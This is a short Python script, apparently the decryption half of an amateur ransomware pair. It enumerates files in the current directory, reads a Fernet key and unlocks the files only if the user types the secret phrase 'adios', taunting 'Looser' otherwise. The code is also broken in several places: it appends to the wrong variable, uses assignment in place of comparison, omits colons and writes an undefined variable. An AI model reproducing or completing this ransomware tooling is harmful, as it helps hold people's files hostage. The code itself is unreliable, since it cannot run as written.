#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#  finding some files

files = []


#  only wanna encript files not any dictoraroes
for file in os.listdir():
	if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	#  append only the file, check is it a file or dict then append
	if os.path.isfile(file):
		file.append(file)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

secreatphrase = "adios"

user_phrase = input("Enter the secreat pharase to decrypt the files\n")


if user_phrase = secreatphrase
	for file in files:
		with open(file, "rb") as thefile
			contents = thefile.read()
		contents_decrypated = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_encrypated)
		print("congrats u are saved")

else:
	print("Looser")